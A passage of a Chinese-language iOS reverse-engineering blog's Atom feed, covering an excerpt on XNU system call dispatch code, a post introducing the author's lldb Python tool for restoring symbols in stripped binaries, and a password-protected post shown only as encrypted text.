SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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